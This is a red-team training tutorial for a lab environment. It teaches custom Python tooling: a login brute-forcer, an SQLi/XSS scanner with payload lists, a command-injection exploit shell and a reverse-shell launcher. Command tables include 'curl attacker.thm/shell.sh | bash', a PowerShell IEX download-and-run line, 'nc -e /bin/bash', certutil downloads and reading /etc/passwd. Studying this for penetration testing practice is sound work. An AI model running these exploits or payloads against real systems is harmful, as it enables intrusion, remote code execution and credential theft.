# Custom tooling is a vital component of web application red teaming, as off-the-shelf software often fails to meet the specific requirements of a unique engagement. This room explores the various approaches to developing bespoke tools, each offering its own set of advantages and limitations.

The primary focus is on leveraging code to build exploits and utilities from scratch. Coding is considered the most versatile method because it empowers you to:

    Create bespoke software tailored to highly specific operational needs.

    Adapt existing exploits, allowing you to customise third-party scripts for your particular target.

While the examples provided utilise Python, the underlying principles are universal and can be applied to any programming language. It is time to dive in and begin crafting your own custom toolkit!

## Why Bespoke Tooling is Essential

In the context of a red team engagement, relying purely on off-the-shelf software is often a recipe for failure. While commercial and open-source tools are powerful, they are frequently "signed"—meaning their signatures are well-known to Antivirus (AV) and Endpoint Detection and Response (EDR) systems.

By developing your own kit, you gain several strategic advantages:

    Bespoke Functionality: You can tailor tools to meet the unique quirks of a specific target's architecture.

    Automation: You can chain exploits together into automated workflows for repetitive tasks.

    Evasion: Custom code is less likely to trigger signature-based alerts.

    Adaptability: You can take existing "Proof of Concept" (PoC) code and modify it to suit your exact environment.

## The Great Debate: Scripting vs. Compiled Languages

Choosing the right language is a balance between development speed and operational stealth.
Comparison Table


| Factor | Scripting (Python, Ruby, JS) | Compiled (Go, C++, .NET) |
| :--- | :--- | :--- |
| **Development Speed** | Very fast; code is interpreted instantly. | Slower; requires a compilation step. |
| **Performance** | Slower; interpretation happens at runtime. | Faster; optimised into machine code. |
| **Portability** | Requires an interpreter (e.g., Python installed). | Can often run natively as a standalone binary. |
| **Evasion** | High detection risk due to script patterns. | Harder to analyse; better for bypassing EDR. |
| **Interfacing** | Excellent for tool-to-tool automation. | Provides low-level system resource access. |


## Selecting Your Language

Each language brings a different "flavour" to your arsenal. While this room focuses on Python, understanding the alternatives is key for a well-rounded operator:

    Python (Scripting): The "Swiss Army Knife." Ideal for rapid prototyping and has an immense library for networking and web interaction.

    JavaScript (Scripting): The king of web-based exploits (like XSS payloads) but poor for low-level system tasks.

    Go / Golang (Compiled): Offers excellent concurrency (performing many tasks at once) and easy cross-compilation for different operating systems.

    C++ (Compiled): Provides the highest performance and direct memory manipulation, making it the gold standard for creating stealthy, complex malware.

    .NET / C# (Compiled): Deeply integrated with Windows APIs, making it perfect for bypassing modern Windows security features.

## Why We Start with Python

Python remains the most popular choice for security researchers for several reasons:

    Readability: The syntax is almost like English, allowing you to modify tools on the fly during an engagement.

    Extensive Libraries: Libraries like requests for web interaction or scapy for packet manipulation save hundreds of hours of work.

    Cross-Platform: A script written on macOS will likely work on Linux or Windows with minimal changes.

    Conversion: Tools like py2exe or PyInstaller allow you to "wrap" your script into a Windows executable if the target doesn't have Python installed.

## Developing a Brute-Forcer with Python

Brute-forcing is a foundational technique in penetration testing. While many automated tools exist, writing your own allows you to bypass specific client-side validations or handle non-standard authentication flows that might trip up a generic scanner.

### The Core Arsenal

To build our tool, we rely on three pillars of the Python ecosystem:

    requests Library: This is the industry standard for interacting with web applications. It allows us to programmatically "fill out" login forms by sending POST requests.

    Response Analysis: Unlike a human, the script doesn't "see" the login page. We must teach it to look for specific markers of success, such as a 302 Redirect to a dashboard, a specific Set-Cookie header, or a "Welcome" string in the HTML.

    string & itertools: These built-in modules are perfect for generating character sequences or iterating through wordlists efficiently.

Understanding the Workflow

Before we write a single line of code, we need to map out how a script "thinks" compared to a manual login attempt.


| Step | Action | Python Component |
| :--- | :--- | :--- |
| **1** | Load credentials | `open('wordlist.txt', 'r')` |
| **2** | Send login data | `requests.post(url, data=payload)` |
| **3** | Inspect the result | `if "Dashboard" in response.text:` |
| **4** | Handle failure | `continue` to the next pair |

## Practical Application: Analyzing lab1

When you visit http://python.thm/labs/lab1, your first step isn't coding—it's investigation. You need to use your browser's Developer Tools (F12) to identify:

    The Target URL: Where is the form actually sending the data? (Check the <form action="..."> attribute).

    Parameter Names: Does the app expect username and password, or something else like user and pwd?

    The "Failure" Message: What does the page say when you get it wrong? (e.g., "Invalid credentials"). We will use this to tell our script to keep trying.

### Basic Script Structure

Here is a simplified blueprint of how we will approach the lab:

```python
import requests

url = "http://python.thm/labs/lab1"
username = "admin"
password_list = ["123456", "password", "admin123"] # In a real scenario, load from a file

for password in password_list:
    # Creating the payload to match the form fields
    payload = {'username': username, 'password': password}
    
    # Sending the POST request
    response = requests.post(url, data=payload)
    
    # Checking if the login was successful
    if "Invalid" not in response.text:
        print(f"Success! Password found: {password}")
        break
    else:
        print(f"Attempt failed: {password}")
``` 

To complete this task in your environment, ensure your script is saved correctly and that you have mapped the domain in your /etc/hosts file. Using a custom script like this is a classic example of bespoke automation—it’s faster than manual entry and more targeted than a generic tool.
Breakdown of the Script Logic

The script follows a linear, logical flow to systematically exhaust all possible combinations.

* List Comprehension: The line password_list = [str(i).zfill(4) for i in range(10000)] is a very "Pythonic" way to generate our payload. It builds the entire list in memory instantly, ensuring we cover everything from 0000 to 9999.

* The POST Request: Unlike a GET request (where data is in the URL), a POST request sends the credentials in the body of the HTTP message, which is how most modern login forms function.

* Negative Matching: By checking if "Invalid" is not in the response, the script intelligently identifies when the server stops complaining and finally lets us in.


### Executing the Attack

    Open the Terminal on your AttackBox.

    Create the file: nano bruteforce.py and paste the code provided.

    Run the script:

    ```
    python3 bruteforce.py
    ```

### Expected Output

The script will begin printing attempts. Because it's running locally (or over a fast internal network), it should cycle through several attempts per second. Once the correct 4-digit PIN is hit, you will see:

```
[+] Found valid credentials: admin:XXXX
```

## The Bottleneck: I/O Bound Tasks

Brute-forcing is what we call an I/O bound task. Your CPU isn't doing much heavy lifting; it’s mostly sitting idle while waiting for the web server to respond over the network.

To solve this, we can use two primary "British motorway" approaches to speed things up:

### 1. Multi-threading

Multi-threading allows your script to start a new request before the previous one has finished. It’s like opening ten different checkout lanes at once. In Python, the concurrent.futures module makes this very straightforward.

    The Benefit: Significant speed increase with relatively simple code.

    The Risk: If you start too many threads (e.g., 100+), you might accidentally perform a Denial of Service (DoS) attack on the target or get your IP banned by a Web Application Firewall (WAF).

### 2. Asynchronous Programming (asyncio & aiohttp)

While threading uses multiple "workers," asynchronous programming uses a single worker who is very good at multitasking. It sends a request, and instead of waiting, it immediately sends the next one. When a response eventually comes back, it "handles" it.

    The Benefit: Extremely efficient and uses very little memory.

    The Drawback: The syntax (async and await) is a bit more "fiddly" and can be harder to debug for beginners.


| Approach | Logic | Real-world Analogy |
| :--- | :--- | :--- |
| **Sequential** | One by one. | A single person posting letters one at a time. |
| **Multi-threading** | Multiple workers. | A team of people posting letters simultaneously. |
| **Asynchronous** | "One worker, many hands." | One person throwing all the letters into the box at once. |

We're moving from the "brute force" approach (hammering the door) to a more "surgical" one: Vulnerability Scanning. Instead of guessing credentials, we are now probing the application's logic to see if we can trick it into doing something it wasn't designed to do.

In this task, we'll build a custom scanner to identify two of the most infamous vulnerabilities in web security:

### 1. Command Injection (Server-Side)

This occurs when an application passes unsafe user-supplied data (such as a form input or HTTP header) to a system shell. An attacker can use this to execute operating system commands on the server.

    The Goal: Execute commands like whoami, ls, or cat /etc/passwd.

    The Risk: Total server compromise.

### 2. Cross-Site Scripting / XSS (Client-Side)

XSS happens when an application includes untrusted data in a web page without proper validation or escaping. Unlike Command Injection, this attack targets the users of the application rather than the server itself.

    The Goal: Inject a malicious script (usually JavaScript) that runs in the victim's browser.

    The Risk: Stealing session cookies, redirecting users, or defacing the website.

### How a Custom Scanner Works

A vulnerability scanner essentially performs a "fuzzing" operation. It takes a list of payloads (strings designed to trigger a bug) and injects them into every possible input field.

### Building the Logic in Python

To build this, our script needs to:

    Define Payloads: A list of strings like ; ls for Command Injection or <script>alert(1)</script> for XSS.

    Submit Payloads: Use the requests library to send these payloads to the target URL's parameters.

    Analyse the Reflection: * For XSS: Does the exact payload appear in the HTML response?

        For Command Injection: Does the response contain the output of our command (e.g., does it show the current user or a directory listing)?

- Key Concept: The "Reflector"

When coding your scanner, the most important part is the detection logic. A simple if payload in response.text is often enough for basic XSS, but for Command Injection, you might look for specific system patterns (like the structure of a Linux password file).

### Adapting the Script for the "Departments" Endpoint

To scan the new endpoint, you simply need to update the url variable and ensure the params key matches the new input field.

1. Update the URL:
Change the target to:

```python
url = "http://python.thm/labs/lab2/departments.php?name="
```

2. Adjust the scan_payload function:
Since the parameter name has changed from id to name, ensure your request reflects that:

```python
# Updated parameter key to "name"
response = requests.get(url, params={"name": payload})
```

### What to Look For

When you execute the script against the departments page, pay attention to the output:

    SQLi Detection: If the database query for the department name isn't sanitized, payloads like ' or ' OR '1'='1 might trigger the errors in your sqli_errors list.

    XSS Detection: If you enter <script>alert('XSS')</script> as the name and the page reflects that exact string back to you (triggering a popup in a real browser), the script will flag it as a reflection.

```python
import re
# This looks for any variation of "MySQL Error" regardless of case
if re.search(r"mysql\s+error", content, re.IGNORECASE):
    print("Potential SQLi Found!")
```

- script

```python
import requests
import re
import threading

url = "http://python.thm/labs/lab2/greetings.php?id="

payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

def scan_payload(vuln_type, payload):
    response = requests.get(url, params={"id": payload})
    content = response.text.lower()

    if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
        print(f"[+] Potential SQL injection detected with payload: {payload}")

    elif vuln_type == "XSS" and payload.lower() in content:
        print(f"[+] Potential XSS detected with payload: {payload}")

threads = []
for vuln, tests in payloads.items():
    for payload in tests:
        t = threading.Thread(target=scan_payload, args=(vuln, payload))
        threads.append(t)
        t.start()

# Wait for all threads to finish
for t in threads:
    t.join()
```


- To apply this logic to the new departments.php?name= endpoint, you’ll want to adapt your script to target the name parameter instead of id.

Before you run your tests, here is a breakdown of how your script's logic interacts with the server to find these vulnerabilities:

### Key Takeaways from the Code

    Targeting: The script uses requests.get() with the params argument. This automatically URL-encodes your payloads (like turning < into %3C), which is essential for the server to receive them correctly.

* Logic (SQLi): It looks for "cries for help" from the database. If a payload breaks a query and the developer hasn't hidden error messages, the database returns a syntax error which our script flags.

* Logic (XSS): It checks if the server is a "mirror." If the script sends <script> and the server sends <script> back in the HTML without changing it to something safe like &lt;script&gt;, the browser will execute it.

* Efficiency: Using threading allows the script to work like a team rather than a single person. Instead of waiting for one request to finish before starting the next, it fires them all off at once.

### Adapting for the "Departments" Endpoint

To scan the new endpoint, you simply need to update the url variable and ensure the params key matches the new input field.

1. Update the URL:
Change the target to:

```python
url = "http://python.thm/labs/lab2/departments.php"
```

2. Adjust the scan_payload function:
Since the parameter name has changed from id to name, update the dictionary in the requests.get call:

```python
# Updated parameter key to "name"
response = requests.get(url, params={"name": payload})
```

### Quick Tip on Regex

While the current script uses any(error in content), you mentioned the re library earlier. If you want to make your scanner more robust, you can use regex to find patterns that aren't exact string matches, such as:

```python
import re
# This looks for variations of "SQL syntax" regardless of case
if re.search(r"sql\s+syntax", content, re.IGNORECASE):
    print(f"[+] Potential SQLi Found with payload: {payload}")
```

## Exploit Development Using Python

Python is one of the most widely used languages for exploit development due to its flexibility and powerful libraries. Python is often used to automate exploitation tasks such as:

    Identifying and exploiting injection vulnerabilities (e.g.,  , SSTI)
    Exploiting Remote Code Execution ()
    Automating post-exploitation (e.g., reverse shells, privilege escalation)

Once an vulnerability is identified, we can execute various commands for reconnaissance, privilege escalation, and lateral movement. Here are common commands used on and Windows targets:


| Command Linux RCE| Description |
| :--- | :--- |
| `whoami` | Displays the user executing the command |
| `id` | Shows user and group IDs |
| `uname -a` | Prints system details |
| `cat /etc/passwd` | Reads the system’s password file (if permissions allow) |
| `ls -la` | Lists files with permissions and ownership |
| `curl http://attacker.thm/shell.sh \| bash` | Downloads and executes a shell script |
| `nc -e /bin/bash <attackbox_ip> <port>` | Establishes a reverse shell |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrades to an interactive shell |



| Command Windows RCE| Description |
| :--- | :--- |
| `whoami` | Shows the current user |
| `hostname` | Displays system hostname |
| `ipconfig /all` | Prints network information |
| `net user` | Lists local users |
| `tasklist` | Shows running processes |
| `certutil -urlcache -f http://attacker.thm shell.exe` | Downloads a malicious executable |
| `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.thm')"` | Downloads and executes a PowerShell script |


### Basic Exploit Script

The following Python script sends a malicious payload to the vulnerable web application and retrieves the command output:

```python
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

# Command to execute
command = "whoami"

# Construct the exploit request
response = requests.get(TARGET_URL + command)

# Print the response
if response.status_code == 200:
    print("[+] Command Output:")
    print(response.text)
else:
    print("[-] Exploit failed. HTTP Status:", response.status_code)
```

### Enhancing the Exploit

Instead of executing a single command, we can create an interactive shell to run multiple commands dynamically.

```python
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

print("[+] Interactive Exploit Shell")
while True:
    cmd = input("Shell> ")  
    if cmd.lower() in ["exit", "quit"]:
        break
    
    response = requests.get(TARGET_URL + cmd)
    
    if response.status_code == 200:
        print(response.text)
    else:
        print("[-] Exploit failed")
```

### How a Reverse Shell Works

In a typical connection (like browsing a website), you (the client) connect to the server. However, firewalls usually block incoming connections to unknown ports. A Reverse Shell flips the script: the compromised server initiates a connection out to your machine. Since most firewalls allow outgoing traffic, this connection usually sails right through.

### The Two-Step Process

To catch the shell, you need a "listener" and an "executor."
1. The Listener (Your Machine)

You use Netcat (nc) to open a port and wait for the server to "call home."

    -l: Listen mode.

    -v: Verbose (tell me what’s happening).

    -n: Numeric only (don't waste time resolving DNS).

    -p 4444: The port number you've chosen

### 2. The Payload (The Target)

The Python script sends a command that tells the server to run ncat. The -e /bin/bash flag is the "magic" part—it tells ncat to take the standard input/output of the Linux bash shell and redirect it over the network to your IP.

- Why Customise This with Python?

While the payload looks simple, real-world environments often require Python to handle URL Encoding. If you send a payload with spaces or special characters directly via requests.get, the web server might misinterpret it.

A more robust version of your script might look like this:

```python
import requests
from urllib.parse import quote

TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="
# Replace with your actual AttackBox IP
ATTACKBOX_IP = "10.10.10.10" 
payload = f"ncat {ATTACKBOX_IP} 4444 -e /bin/bash"

# It is best practice to URL-encode the payload
encoded_payload = quote(payload)

print(f"[+] Launching reverse shell to {ATTACKBOX_IP}:4444...")

# We use a short timeout because the script will 'hang' 
# while the shell is active.
try:
    requests.get(TARGET_URL + encoded_payload, timeout=2)
except requests.exceptions.ReadTimeout:
    print("[+] Shell should be active on your listener!")
```

### Troubleshooting the Connection

If your listener is sitting there silently, consider these "gotchas" common in UK and international labs:

    IP Mismatch: Ensure you are using your VPN IP (often tun0), not your local network IP.

    WAF/Filtering: Sometimes the -e flag is blocked. You might need to use a more complex Python or Bash "one-liner" to achieve the same result.

    Permissions: The user www-data (the web server's default account) has limited permissions. You can run whoami and id once you're in to see exactly what you're working with.

## Automating Session Management

Handling cookies manually is a bit like carrying your passport in your hand and showing it to every single person you meet at the airport—it’s tedious and prone to error. In web application red teaming, if your script doesn't handle cookies correctly, the server will treat every request as a "new visitor" and redirect you back to the login page.

This is where requests.Session() becomes an essential part of your toolkit.
How requests.Session() Works

When you use a standard requests.get(), it is a "stateless" interaction; the script forgets everything the moment the request is finished. A Session object, however, acts like a mini web browser. It automatically:

    Captures cookies sent by the server via Set-Cookie headers.

    Stores them in a local "cookie jar."

    Re-attaches them to every subsequent request you make using that session.

### Implementation in Python

Here is how you would adapt your previous brute-force or exploit scripts to be "session-aware." This is particularly useful if you need to log in once and then perform multiple vulnerability scans.

```python 
import requests

# Create a session object
session = requests.Session()

# 1. Log in (the session will automatically grab the session cookie)
login_url = "http://python.thm/login.php"
credentials = {"username": "admin", "password": "correct_password"}
session.post(login_url, data=credentials)

# 2. Now, all subsequent requests 'inherit' that authenticated state
dashboard_url = "http://python.thm/dashboard.php"
response = session.get(dashboard_url)

if "Welcome, admin" in response.text:
    print("[+] Successfully accessed protected area using Session!")
```
### Strategic Advantages for Red Teamers

    Bypassing CSRF (Cross-Site Request Forgery): Many modern apps require a CSRF token. With a session object, you can GET the login page, scrape the token from the HTML, and the session will keep the associated cookie active so your follow-up POST request is accepted.

    Reduced Noise: By maintaining a single session, you avoid the "log-in/log-out" pattern that often sticks out like a sore thumb in server logs.

    Efficiency: Under the hood, requests.Session uses connection pooling. It reuses the same underlying TCP connection for multiple requests to the same host, making your custom tools significantly faster.

### The "Bespoke" Edge

In a professional engagement, you might find that the application uses a custom header for authentication (e.g., X-Auth-Token) instead of a standard cookie. You can easily hardcode this into your session object:

```python
session.headers.update({'X-Auth-Token': 'your-extracted-token'})
```
